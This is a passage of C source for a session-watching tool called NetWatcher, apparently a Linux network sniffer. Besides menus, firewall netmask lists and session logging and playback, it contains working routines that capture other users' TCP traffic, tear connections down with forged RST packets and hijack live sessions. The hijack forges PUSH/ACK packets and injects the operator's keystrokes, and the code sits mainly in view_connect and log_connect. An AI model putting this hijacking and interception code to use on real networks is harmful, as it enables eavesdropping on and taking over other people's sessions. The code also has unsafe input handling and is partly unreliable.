 * This function saves all the netmasks in the netmask list to a
 * data file that the user chooses.  This data file can later be
 * loaded.
 */
void save_netmask(void)
{
    char *filename;
    int i=0;
    FILE *fp;

    filename=(char *)malloc(100);

        /* Get filename */
    printf("Data filename> ");
    scanf("%s",filename);
    sem_wait(semlockptr,0);

        /* Check if list is empty */
    if((share_data->addrlist[0].init==0)) {
        printf("No firewalls to save\n\n");
    }

        /* Open data file */
    else if(!(fp=fopen(filename,"w"))) {
        printf("Error opening data file\n\n");
    }
    else {
      sem_wait(semlockptr,0);

        /* Run through netmask list */
      while(!(share_data->addrlist[i].init==0)) {

            /* Write netmask to file */
        fprintf(fp,"%i %i %i %i %i %i %i %i %i\n",share_data->addrlist[i].net[0][0], \
                share_data->addrlist[i].net[0][1],share_data->addrlist[i].net[0][2], \
                share_data->addrlist[i].net[0][3],share_data->addrlist[i].net[1][0], \
                share_data->addrlist[i].net[1][1],share_data->addrlist[i].net[1][2], \
                share_data->addrlist[i].net[1][3],share_data->addrlist[i].active);
        i++;
        sem_wait(semlockptr,0);
      }

        /* Close file */
      fclose(fp);
      printf("Firewall list saved\n\n",filename);
    }
    upause();
}


/* Int find_netmask()
 * This function scans through the list of netmasks, trying to find
 * a certian netmask.  If the netmask was found, a 1 is returned.
 * Otherwise, a 0 is returned.
 */
int find_netmask(struct netaddr *tempaddr)
{
    int i=0;

    sem_wait(semlockptr,0);

        /* Run through netmask list */
    while(!(share_data->addrlist[i].init==0)) {

            /* Check for match */
        if(((share_data->addrlist[i].net[0][0]==tempaddr->net[0][0])&&(share_data->addrlist[i].net[0][1]==tempaddr->net[0][1]))) {
          if(((share_data->addrlist[i].net[0][2]==tempaddr->net[0][2])&&(share_data->addrlist[i].net[0][3]==tempaddr->net[0][3]))) {
            if(((share_data->addrlist[i].net[1][0]==tempaddr->net[1][0])&&(share_data->addrlist[i].net[1][1]==tempaddr->net[1][1]))) {
              if(((share_data->addrlist[i].net[1][2]==tempaddr->net[1][2])&&(share_data->addrlist[i].net[1][3]==tempaddr->net[1][3]))) {
                return(1);
              }
            }
          }
        }
        i++;
        sem_wait(semlockptr,0);
    }

        /* Match not found */
    return(0);
}


/* Int check_firewall()
 * This function is called from get_connects(), when a new connection
 * is found.  It then compares it to the list of active firewalls,
 * and if a applicable firewall is found, a 1 is returned.  Otherwise
 * a 0 is returned.
 */
int check_firewall(long local, long remote)
{
    int i=0;
    char *addrname;
    struct netaddr *tempaddr;

    addrname=(char *)malloc(100);
    tempaddr=(struct netaddr *)malloc(sizeof(struct netaddr));

        /* Get netmasks for new connection */
    sprintf(addrname,"%s",inet_ntoa(local));
    get_masks(tempaddr,addrname,0);
    sprintf(addrname,"%s",inet_ntoa(remote));
    get_masks(tempaddr,addrname,1);
    sem_wait(semlockptr,0);

        /* Run through firewall list */
    while(!(share_data->addrlist[i].init==0)) {
       if(share_data->addrlist[i].active==1) {

            /* Check for match */
        if((share_data->addrlist[i].net[0][0]==tempaddr->net[0][0])||(share_data->addrlist[i].net[0][0]==0))
         if((share_data->addrlist[i].net[0][1]==tempaddr->net[0][1])||(share_data->addrlist[i].net[0][1]==0))
          if((share_data->addrlist[i].net[0][2]==tempaddr->net[0][2])||(share_data->addrlist[i].net[0][2]==0))
           if((share_data->addrlist[i].net[0][3]==tempaddr->net[0][3])||(share_data->addrlist[i].net[0][3]==0))
            if((share_data->addrlist[i].net[1][0]==tempaddr->net[1][0])||(share_data->addrlist[i].net[1][0]==0))
             if((share_data->addrlist[i].net[1][1]==tempaddr->net[1][1])||(share_data->addrlist[i].net[1][1]==0))
              if((share_data->addrlist[i].net[1][2]==tempaddr->net[1][2])||(share_data->addrlist[i].net[1][2]==0))
               if((share_data->addrlist[i].net[1][3]==tempaddr->net[1][3])||(share_data->addrlist[i].net[1][3]==0)) {
                return(1);
               }
       }
       i++;
       sem_wait(semlockptr,0);
    }

        /* Match not found */
    return(0);
}


/* Void load_netmask()
 * This function loads a firewall data file, adding to the list of
 * active firewalls.  Each firewall is first checked to make sure
 * it is not already in the list.
 */
void load_netmask(void)
{
    char *filename;
    int curmask=1,i=0;
    struct netaddr *tempaddr,*templist;
    FILE *fp;

    filename=(char *)malloc(100);
    tempaddr=(struct netaddr *)malloc(sizeof(struct netaddr));

        /* Get data filename */
    printf("Data filename> ");
    scanf("%s",filename);
    sem_wait(semlockptr,0);

        /* Skip to end of list */
    while(!(share_data->addrlist[i].init==0)) {
        i++;
    }

        /* Open data file */
    if(!(fp=fopen(filename,"r"))) {
        printf("Error opening data file.\n");
    }
    else {
      while(!feof(fp)) {

            /* Read netmask from file */
        fscanf(fp,"%i %i %i %i %i %i %i %i %i",&tempaddr->net[0][0],&tempaddr->net[0][1], \
        &tempaddr->net[0][2],&tempaddr->net[0][3],&tempaddr->net[1][0],&tempaddr->net[1][1], \
        &tempaddr->net[1][2],&tempaddr->net[1][3],&tempaddr->active);

            /* Check if already in list */
        if(!(find_netmask(tempaddr))) {
          sem_wait(semlockptr,-1);

            /* Add netmask */
          share_data->addrlist[i].net[0][0]=tempaddr->net[0][0];
          share_data->addrlist[i].net[0][1]=tempaddr->net[0][1];
          share_data->addrlist[i].net[0][2]=tempaddr->net[0][2];
          share_data->addrlist[i].net[0][3]=tempaddr->net[0][3];
          share_data->addrlist[i].net[1][0]=tempaddr->net[1][0];
          share_data->addrlist[i].net[1][1]=tempaddr->net[1][1];
          share_data->addrlist[i].net[1][2]=tempaddr->net[1][2];
          share_data->addrlist[i].net[1][3]=tempaddr->net[1][3];
          share_data->addrlist[i].active=tempaddr->active;
          share_data->addrlist[i].init=1;
          share_data->totalfirewalls++;
          sem_wait(semlockptr,1);
          i++;
        }
      }

        /* Mark end of list */
      share_data->addrlist[i].init=0;
      fclose(fp);
      printf("Firewall list loaded\n\n",filename);
    }
    upause();
}


/* Int firewall_menu()
 * This is the firewall submenu.  It calls all the functions to control
 * addition and deletion of firewalls, and everything else.
 */
int firewall_menu(void)
{
    char *usercmd;
    int cmdnum;

    usercmd=(char *)malloc(300);
    for(;;) {
        fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
        printf("Firewall Menu\n\n");
        printf("1. Add firewall\n");
        printf("2. Delete firewall\n");
        printf("3. Activate firewall\n");
        printf("4. Deactivate firewall\n");
        printf("5. Save firewalls to file\n");
        printf("6. Load firewalls from file\n");
        printf("7. Return to main menu\n\n");
        printf("Command> ");
        scanf("%s",usercmd);
        cmdnum=atoi(usercmd);
        switch(cmdnum) {
            case 1:
              add_netmask();
              break;

            case 2:
              delete_netmask();
              break;

            case 3:
              set_netmask(0);
              break;

            case 4:
              set_netmask(1);
              break;

            case 5:
              save_netmask();
              break;

            case 6:
              load_netmask();
              break;

            case 7:
              return(0);
              break;

            default:
              printf("Invalid Command.\n");
              upause();
              break;
        }
    }
    return(0);
}


/* Void load_config()
 * This functions loads the configuration file upon program execution.
 * If no configuration file is found, the default config files are
 * used.
 */
void load_config(void)
{
    FILE *fp;
    char *tempdata;
    int tempint;

    tempdata=(char *)malloc(100);

        /* Open data file */
    if(!(fp=fopen("netwatch.cfg","r"))) {
        printf("Configuration file not found.  Using default values.\n\n");

            /* Set default config */
        share_data->netconfig.hijacktype=1;
        share_data->netconfig.traffictype=1;
        share_data->netconfig.inputtype=1;
        share_data->netconfig.firedaemon=1;
    }
    else {
        printf("Loading configuration.\n\n");
        fscanf(fp,"%s",tempdata);
        tempint=atoi(tempdata);

            /* Check if input is valid */
        if(!((tempint==0)||(tempint==1))) {
            printf("Configuration file corrupt!  Please delete it.\n");
            fclose(fp);
            exit(1);
        }
        else share_data->netconfig.hijacktype=tempint;
        fscanf(fp,"%s",tempdata);
        tempint=atoi(tempdata);
        if(!((tempint==0)||(tempint==1))) {
            printf("Configuration file corrupt!  Please delete it.\n");
            fclose(fp);
            exit(1);
        }
        else share_data->netconfig.traffictype=tempint;
        fscanf(fp,"%s",tempdata);
        tempint=atoi(tempdata);

            /* Check if input is valid */
        if(!((tempint==0)||(tempint==1))) {
            printf("Configuration file corrupt!  Please delete it.\n");
            fclose(fp);
            exit(1);
        }
        else share_data->netconfig.inputtype=tempint;
        fscanf(fp,"%s",tempdata);
        tempint=atoi(tempdata);

            /* Check if input is valid */
        if(!((tempint==0)||(tempint==1))) {
            printf("Configuration file corrupt!  Please delete it.\n");
            fclose(fp);
            exit(1);
        }
        else share_data->netconfig.firedaemon=tempint;

            /* Close data file */
        fclose(fp);
    }
    upause();
}


/* Void save_config()
 * This function saves the program configuration to the config data
 * file.
 */
void save_config(void)
{
    FILE *fp;

        /* Open data file */
    if(!(fp=fopen("netwatch.cfg","w"))) {
        printf("Error opening configuration file.\n\n");
        upause();
    }
    else {
        sem_wait(semlockptr,0);

            /* Write config information */
        fprintf(fp,"%i\n",share_data->netconfig.hijacktype);
        fprintf(fp,"%i\n",share_data->netconfig.traffictype);
        fprintf(fp,"%i\n",share_data->netconfig.inputtype);
        fprintf(fp,"%i\n",share_data->netconfig.firedaemon);
        fclose(fp);
        printf("Configuration saved.\n\n");
        upause();
    }
}


/* Int config_menu()
 * This is the program configuration submenu.  It lets the user
 * set all configuration options, and save the configuration file.
 */
int config_menu(void)
{
    char *usercmd,*tempstr;
    int cmdnum;

    usercmd=(char *)malloc(300);
    for(;;) {
        fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
        sem_wait(semlockptr,0);
        printf("NetWatch Configuration\n\n");
        printf("1. Packet input method ");
        if(share_data->netconfig.inputtype==1) printf("[Network]\n");
        else printf("[File]\n");
        printf("2. Session hijack type ");
        if(share_data->netconfig.hijacktype==1) printf("[Takeover]\n");
        else printf("[Do not Takeover]\n");
        printf("3. Data traffic type ");
        if(share_data->netconfig.traffictype==1) printf("[Network]\n");
        else printf("[Local]\n");
        printf("4. Firewall daemon ");
        if(share_data->netconfig.firedaemon==1) printf("[Active]\n");
        else printf("[Not Active]\n");
        printf("5. Save configuration\n");
        printf("6. Return to main menu\n\n");
        printf("Command> ");
        scanf("%s",usercmd);
        cmdnum=atoi(usercmd);
        switch(cmdnum) {
            case 1:
              sem_wait(semlockptr,0);
              if(share_data->netconfig.inputtype==1) {
                sem_wait(semlockptr,-1);
                share_data->netconfig.inputtype=0;
                sem_wait(semlockptr,1);
              }
              else {
                sem_wait(semlockptr,-1);
                share_data->netconfig.inputtype=1;
                sem_wait(semlockptr,1);
              }
              break;

            case 2:
              sem_wait(semlockptr,0);
              if(share_data->netconfig.hijacktype==1) {
                sem_wait(semlockptr,-1);
                share_data->netconfig.hijacktype=0;
                sem_wait(semlockptr,1);
              }
              else {
                sem_wait(semlockptr,-1);
                share_data->netconfig.hijacktype=1;
                sem_wait(semlockptr,1);
              }
              break;

            case 3:
              sem_wait(semlockptr,0);
              if(share_data->netconfig.traffictype==1) {
                sem_wait(semlockptr,-1);
                share_data->netconfig.traffictype=0;
                sem_wait(semlockptr,1);
              }
              else {
                sem_wait(semlockptr,-1);
                share_data->netconfig.traffictype=1;
                sem_wait(semlockptr,1);
              }
              break;

            case 4:
              sem_wait(semlockptr,0);
              if(share_data->netconfig.firedaemon==1) {
                sem_wait(semlockptr,-1);
                share_data->netconfig.firedaemon=0;
                sem_wait(semlockptr,1);
              }
              else {
                sem_wait(semlockptr,-1);
                share_data->netconfig.firedaemon=1;
                sem_wait(semlockptr,1);
              }
              break;

            case 5:
              save_config();
              break;

            case 6:
              return(0);
              break;

            default:
              printf("Invalid Command.\n");
              upause();
              break;
        }
    }
    return(0);
}


/* Voud upause()
 * This function pauses the screen and waits for a key to be hit.
 * It is used so a user can read a message printed to the screen
 * before it is cleared.
 */
void upause(void)
{
    char *userkey;
    userkey=(char *)malloc(2);
    set_tty(0);
    for(;;) {
        if(get_ch(userkey)>0) break;
    }
    reset_tty();
}


/* Void print_raw()
 * This function is called from the connection viewing routines.
 * It prints the session packet data to the screen.
 */
void print_raw(char *rawdata,int length)
{
   int c;

   for(c=0;c<length;c++) {
       fprintf(stdout,"%c",rawdata[c]);
   }
}


/* Void print_rawfile()
 * This function is called from the connection logging routines.
 * It writes the time delays, and session packet data to the
 * session log file.
 */
void print_rawfile(FILE *fileptr,long tdelay,char *rawdata,int length)
{

        /* Write data length */
   fwrite(&length,sizeof(int),1,fileptr);

        /* Write time delay */
   fwrite(&tdelay,sizeof(long),1,fileptr);

        /* Write packet data */
   fwrite(rawdata,length,1,fileptr);
}


/* Void view_connect()
 * This is the connection viewing subroutine.  It lets the user
 * watch the connection, kill it, and hijack it.
 */
void view_connect(int connectnum)
{
    struct rawdata rawether;
    struct iphdr *eth_ip;
    struct tcphdr *eth_tcp;
	struct timeval timeout;
    struct sockaddr sockdata;
    int dlen=0,i=0,dlength=0;
    int dlengthb=0;
    int dcount=0;
    int numfound=0,tmpint=0;
    int keyprocess=0,fproc,dc;
    int ethernet;
    int alport,arport,hijacked=0;
    char *userkey;
    char *packetdata,*senddata;
    long prevseqa=0,prevseqb=0;
    long hseq=0;
    unsigned long alocal,aremote;
	fd_set rd,wr;


    i=connectnum;
    packetdata=(char *)malloc(9000);
    userkey=(char *)malloc(2);
    senddata=(char *)malloc(4000);
    sem_wait(semlockptr,0);
    ethernet=share_data->sessionsock;

        /* Set temporary connection values */
    alocal=share_data->connnode[i].local;
    aremote=share_data->connnode[i].remote;
    alport=share_data->connnode[i].lport;
    arport=share_data->connnode[i].rport;
    printf("Viewing connection from %s Port %d to: ",inet_ntoa(share_data->connnode[i].local),ntohs(share_data->connnode[i].lport));
    printf("%s Port %d\n",inet_ntoa(share_data->connnode[i].remote),ntohs(share_data->connnode[i].rport));
    printf("[To exit hit 'Q'.  To hijack connection hit 'H'.  To reset connection hit 'R']\n");
    printf("Press any key to start viewing...\n");

    upause();
    fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
    sem_wait(semlockptr,0);
    set_tty(0);
        /* Loop while connection open */
    while(!(share_data->viewactive==-1)) {

                /* Check if not in hijacking mode */
           if(hijacked==0) {
           if(get_ch(userkey)>0) {

                /* Check for quit */
              if((userkey[0]=='q')||(userkey[0]=='Q'))  break;

                /* Check for connection reset */
              if((userkey[0]=='r')||(userkey[0]=='R')) {

                    /* Check if sequence numbers known */
                if(prevseqb>0) {
                       /* Reset both ends of connection */
                   send_packet( ntohl(alocal),ntohs(alport),ntohl(aremote),ntohs(arport), \
                                prevseqb+(long)dlengthb+1,TH_RST,prevseqa+(long)dlengthb,NULL,0);
                   send_packet( ntohl(aremote),ntohs(arport),ntohl(alocal),ntohs(alport), \
                                prevseqa+(long)dlength+1,TH_RST,prevseqb+(long)dlengthb,NULL,0);
                }
              }

                /* Check for hijack */
              if((userkey[0]=='h')||(userkey[0]=='H')) {

                    /* Check if sequence numbers known */
                if(prevseqb>0) {

                       /* Desync real source */
                   send_packet( ntohl(alocal),ntohs(alport),ntohl(aremote),ntohs(arport), \
                                prevseqb+(long)dlengthb,TH_PUSH|TH_ACK,prevseqa+(long)dlengthb,"\n",1);
                   reset_tty();
                   printf("<Connection hijacked>\n");
                   set_tty(0);
                   hijacked=1;
                   hseq=prevseqb+dlengthb+1;
                }
                else printf("<Try later>\n");
              }
           } }

                /* Check if in hijacking mode */
           else if(hijacked==1) {
           dcount=0;

                /* Read from tty */
           while((get_ch(userkey)>0)&&(hijacked==1)) {

              if(!((int)userkey[0]==27)) {
                senddata[dcount]=userkey[0];
                dcount++;
              }

                /* Close connection */
              else {
                hijacked=0;
                send_packet( ntohl(alocal),ntohs(alport),ntohl(aremote),ntohs(arport), \
                             hseq,TH_RST,prevseqa+(long)dlengthb,NULL,0);
                send_packet( ntohl(aremote),ntohs(arport),ntohl(alocal),ntohs(alport), \
                             prevseqa+(long)dlengthb,TH_RST,hseq,NULL,0);
                share_data->viewactive==-1;
                reset_tty();
                printf("<Hijack Terminated>\n");
                set_tty(0);
              }
           }

                /* Send data */
           if((dcount>0)&&(!((int)userkey[0]==27))) {
                send_packet( ntohl(alocal),ntohs(alport),ntohl(aremote),ntohs(arport), \
                             hseq,TH_PUSH|TH_ACK,prevseqa+(long)dlengthb,senddata,dcount);
                hseq=hseq+dcount;
           } }
           dlength=0;
           dlengthb=0;
           bzero(&sockdata,sizeof(sockdata));
           FD_ZERO(&rd);
           FD_ZERO(&wr);
           FD_SET(ethernet,&rd);
           timeout.tv_sec=0;
           timeout.tv_usec=0;
           eth_ip=(struct iphdr *)(((unsigned long)&rawether.ipdata)-2);
           eth_tcp=(struct tcphdr *)(((unsigned long)&rawether.tcpdata)-2);
           if(FD_ISSET(ethernet,&rd)) {

                    /* Recieve packet */
               recvfrom(ethernet,&rawether,sizeof(rawether),0,&sockdata,&dlen);
           }
           if(rawether.ethdata.h_proto==ntohs(ETH_P_IP)) {
             if(eth_ip->protocol==6) {

                    /* Check if this packet should be printed */
                 if((ntohs(eth_tcp->th_dport)==ntohs(alport))&&(ntohs(eth_tcp->th_sport)==ntohs(arport))) {
                   if((ntohl(eth_ip->saddr)==ntohl(aremote))&&(ntohl(eth_ip->daddr)==ntohl(alocal))) {
                     if(ntohl(eth_tcp->th_seq)>prevseqa) {
                       dlength=ntohs(eth_ip->tot_len)-(sizeof(struct iphdr)+sizeof(struct tcphdr));
                       reset_tty();
                       print_raw(rawether.packetdata-2,dlength);
                       set_tty(0);
                       prevseqa=ntohl(eth_tcp->th_seq);
                       prevseqb=ntohl(eth_tcp->th_ack);
                     }
                   }
                 }

                    /* Check again if packet should be printed */
                 if((ntohs(eth_tcp->th_dport)==ntohs(arport))&&(ntohs(eth_tcp->th_sport)==ntohs(alport))) {
                   if((ntohl(eth_ip->daddr)==ntohl(aremote))&&(ntohl(eth_ip->saddr)==ntohl(alocal))) {
                     if(ntohl(eth_tcp->th_seq)>prevseqb) {
                        dlengthb=ntohs(eth_ip->tot_len)-(sizeof(struct iphdr)+sizeof(struct tcphdr));
                        reset_tty();
                        print_raw(rawether.packetdata-2,dlengthb);
                        set_tty(0);
                        prevseqb=ntohl(eth_tcp->th_seq);
                        prevseqa=ntohl(eth_tcp->th_ack);
                     }
                   }
                 }
             }
           }
           sem_wait(semlockptr,0);
    }

        /* Set tty back to normal */
    reset_tty();
    fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
    printf("\nConnection closed.\n\n");
    upause();
}


/* Void play_connect()
 * This is the logged connection playback routine.  It lets the user view
 * the session from a data file, seeing it exactly as it happened.  Pause,
 * and speed control options are supported.
 */
void play_connect(void)
{
    char *filename;
    char *userkey,*packdata;
    FILE *fileptr;
    long local,remote,tdelay;
    int lport,rport,dlen,i,pspeed=1,pback=1;

    userkey=(char *)malloc(2);
    filename=(char *)malloc(100);
    packdata=(char *)malloc(9000);

        /* Get filename */
    printf("Filename> ");
    scanf("%s",filename);

        /* Open data file */
    if(!(fileptr=fopen(filename,"rb"))) {
        printf("Error opening file.\n\n");
        upause();
    }
    else {

        /* Read connection information */
      fread(&local,sizeof(long),1,fileptr);
      fread(&remote,sizeof(long),1,fileptr);
      fread(&lport,sizeof(int),1,fileptr);
      fread(&rport,sizeof(int),1,fileptr);
      printf("Viewing connection from %s Port %d to: ",inet_ntoa(local),ntohs(lport));
      printf("%s Port %d\n",inet_ntoa(remote),ntohs(rport));
      printf("[To exit hit 'Q'.  Keys 1, 2, 3, 4 control playback speed]\n");
      printf("['S' stops playback. 'P' resumes playback]\n\n");
      printf("Press any key to start viewing...\n");

      upause();
      fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
      sem_wait(semlockptr,0);

        /* Loop till end of file */
      while(!feof(fileptr)) {

                /* Check for user command */
             if(get_ch(userkey)>0) {

                    /* Check if quit */
                if((userkey[0]=='q')||(userkey[0]=='Q'))  break;

                    /* Check speed settings */
                if(userkey[0]=='1') pspeed=1;
                if(userkey[0]=='2') pspeed=2;
                if(userkey[0]=='3') pspeed=3;
                if(userkey[0]=='4') pspeed=4;

                    /* Check for pause playback */
                if((userkey[0]=='s')||(userkey[0]=='S')) {
                    pback=pspeed;
                    pspeed=0;
                }

                    /* Check for resume playback */
                if((userkey[0]=='p')||(userkey[0]=='P')) {
                 if(pspeed==0) pspeed=pback;
                }
             }

                /* If playback not paused */
             if(pspeed>0) {

                    /* Read packet information */
                fread(&dlen,sizeof(int),1,fileptr);
                fread(&tdelay,sizeof(long),1,fileptr);
                fread(packdata,dlen,1,fileptr);

                    /* Do time delay */
                tdelay=tdelay/pspeed;
                for(i=0;i<tdelay;i++) {
                   usleep(50);
                }

                    /* Print packet data */
                print_raw(packdata,dlen);
             }
      }

        /* Close data file */
      fclose(fileptr);

        /* Set tty back to normal */
      reset_tty();
      fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
      printf("\nConnection closed.\n\n");
      upause();
    }
}


/* Void log_connect()
 * This is the session logging subroutine.  It lets the user view
 * the connection, while the session information is being written
 * to a data file.
 */
void log_connect(int connectnum)
{
    struct rawdata rawether;
    struct iphdr *eth_ip;
    struct tcphdr *eth_tcp;
	struct timeval timeout;
    struct sockaddr sockdata;
    int dlen=0,i=0;
    int numfound=0,tmpint=0;
    int keyprocess=0,fproc,dc;
    int ethernet;
    int alport,arport;
    long tdelay;
    long prevseqa=0,prevseqb=0;
    char *userkey,*logfile;
    char *packetdata;
    unsigned long alocal,aremote;
    FILE *fileptr;
	fd_set rd,wr;


    i=connectnum;
    packetdata=(char *)malloc(9000);
    userkey=(char *)malloc(2);
    logfile=(char *)malloc(100);
    sem_wait(semlockptr,0);
    ethernet=share_data->sessionsock;

        /* Set temporary connection values */
    alocal=share_data->connnode[i].local;
    aremote=share_data->connnode[i].remote;
    alport=share_data->connnode[i].lport;
    arport=share_data->connnode[i].rport;

        /* Get filename */
    printf("Filename> ");
    scanf("%s",logfile);
    printf("Logging connection from %s Port %d to: ",inet_ntoa(alocal),ntohs(alport));
    printf("%s Port %d\n",inet_ntoa(aremote),ntohs(arport));
    printf("[To exit hit 'Q']\n");
    printf("Press any key to start viewing...\n");
    upause();

        /* Open file */
    if(!(fileptr=fopen(logfile,"wb"))) {
        printf("Error opening log file.\n\n");
        upause();
    }
    else {

        /* Write connection info */
      fwrite(&alocal,sizeof(long),1,fileptr);
      fwrite(&aremote,sizeof(long),1,fileptr);
      fwrite(&alport,sizeof(int),1,fileptr);
      fwrite(&arport,sizeof(int),1,fileptr);

        /* Set user tty to raw mode */
      set_tty(1);
      for(;;) {
          if(get_ch(userkey)>0) break;
      }
      fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
      sem_wait(semlockptr,0);
      tdelay=0;

        /* Loop while connection active */
      while(!(share_data->viewactive==-1)) {

                /* Check for command */
             if(get_ch(userkey)>0) {

                    /* Check if quit */
                if((userkey[0]=='q')||(userkey[0]=='Q'))  break;
             }
             usleep(50);
             tdelay++;
             bzero(&sockdata,sizeof(sockdata));
             FD_ZERO(&rd);
             FD_ZERO(&wr);
             FD_SET(ethernet,&rd);
             timeout.tv_sec=0;
             timeout.tv_usec=0;
             eth_ip=(struct iphdr *)(((unsigned long)&rawether.ipdata)-2);
             eth_tcp=(struct tcphdr *)(((unsigned long)&rawether.tcpdata)-2);
             if(FD_ISSET(ethernet,&rd)) {

                    /* Recieve packet */
                 recvfrom(ethernet,&rawether,sizeof(rawether),0,&sockdata,&dlen);
             }
             if(rawether.ethdata.h_proto==ntohs(ETH_P_IP)) {
               if(eth_ip->protocol==6) {

                        /* Check if good packet */
                   if((ntohs(eth_tcp->th_dport)==ntohs(alport))&&(ntohs(eth_tcp->th_sport)==ntohs(arport))) {
                     if((ntohl(eth_ip->saddr)==ntohl(aremote))&&(ntohl(eth_ip->daddr)==ntohl(alocal))) {
                       if(eth_tcp->th_flags & (TH_FIN)) break;
                       else if(eth_tcp->th_flags & (TH_RST)) break;
                       if(ntohl(eth_tcp->th_seq)>prevseqa) {

                            /* Print and Log packet */
                         print_raw(rawether.packetdata-2,ntohs(eth_ip->tot_len)-(sizeof(struct iphdr)+sizeof(struct tcphdr)));
                         print_rawfile(fileptr,tdelay,rawether.packetdata-2,ntohs(eth_ip->tot_len)-(sizeof(struct iphdr)+sizeof(struct tcphdr)));
                         prevseqa=ntohl(eth_tcp->th_seq);
                         tdelay=0;
                       }
                     }
                   }

                        /* Check if good packet */
                   else if((ntohs(eth_tcp->th_dport)==ntohs(arport))&&(ntohs(eth_tcp->th_sport)==ntohs(alport))) {
                     if((ntohl(eth_ip->daddr)==ntohl(aremote))&&(ntohl(eth_ip->saddr)==ntohl(alocal))) {
                       if(eth_tcp->th_flags & (TH_FIN)) break;
                       else if(eth_tcp->th_flags & (TH_RST)) break;
                       if(ntohl(eth_tcp->th_seq)>prevseqb) {

                            /* Print and Log packet */
                          print_raw(rawether.packetdata-2,ntohs(eth_ip->tot_len)-(sizeof(struct iphdr)+sizeof(struct tcphdr)));
                          print_rawfile(fileptr,tdelay,rawether.packetdata-2,ntohs(eth_ip->tot_len)-(sizeof(struct iphdr)+sizeof(struct tcphdr)));
                          prevseqb=ntohl(eth_tcp->th_seq);
                          tdelay=0;
                       }
                     }
                   }
               }
             }
             sem_wait(semlockptr,0);
      }

        /* Reset user tty */
      reset_tty();
      fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
      printf("\nConnection closed.\n\n");
      upause();

        /* Close file */
      fclose(fileptr);
    }
}


/* Int reset_connects()
 * This functions resets the list of active connections on the internet.
 * The connections are still active, but they are no longer in the
 * active list after calling this function.
 */
int reset_connects(void)
{
    sem_wait(semlockptr,0);

        /* Check if connection list empty */
    if((share_data->totalconnects==0)) {
        printf("Connection list already empty.\n\n");
        upause();
        return(0);
    }
    sem_wait(semlockptr,-1);

        /* Reset connection list */
    share_data->totalconnects=0;
    share_data->connnode[0].active=0;
    sem_wait(semlockptr,1);
    printf("Connection list reset.\n\n");
    upause();
}

void main(void)
{
    char *usercmd;
    int cmdnum;

    setvbuf(stdout,NULL,_IONBF,0);
    usercmd=(char *)malloc(200);

        /* Get shared memory */
    listptr=shmget(0,sizeof(struct conlist),IPC_CREAT);
    share_data=(struct conlist *)shmat(listptr,0,0);
    share_data->totalconnects=0;
    share_data->shutdown=0;
    share_data->viewactive=-1;
    share_data->viewable.active=0;
    share_data->connnode[0].active=0;

        /* Get semaphore */
    semlockptr=semget(0,1,IPC_CREAT);
    semlockbuf=(struct sembuf *)malloc(sizeof(struct sembuf));
    semlockbuf->sem_num=(ushort)0;
    semlockbuf->sem_flg=(short)0;
    share_data->addrlist[0].init=0;
    share_data->addrlist[0].active=0;

        /* Load configuration */
    get_deftty();
    load_config();

        /* Set ethernet interface */
    startether();

        /* Fork background listening process */
    switch(fork()) {
        case 0:
          get_connects();
          exit(0);
          break;
        case -1:
          perror("Fork: ");
          exit(1);
          break;
    }

        /* Main menu loop */
    for(;;) {
        fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
        printf("NetWatcher Main Menu\n\n");
        printf("1. Reset active connection list\n");
        printf("2. View session\n");
        printf("3. Firewall menu\n");
        printf("4. Configure NetWatcher\n");
        printf("5. Quit\n\n");
        printf("Command> ");
        scanf("%s",usercmd);
        cmdnum=atoi(usercmd);
        switch(cmdnum) {
            case 1:
             reset_connects();
             break;

            case 2:
             print_connections();
             break;

            case 3:
             firewall_menu();
             break;

            case 4:
             config_menu();
             break;

            case 5:
             printf("Exiting.\n");
             sem_wait(semlockptr,-1);
             share_data->shutdown=1;
             close(share_data->ethersock);
             sem_wait(semlockptr,1);
             sleep(1);
             exit(0);
             break;

            default:
             printf("Invalid Command.\n");
             upause();
             break;
        }
    }
}
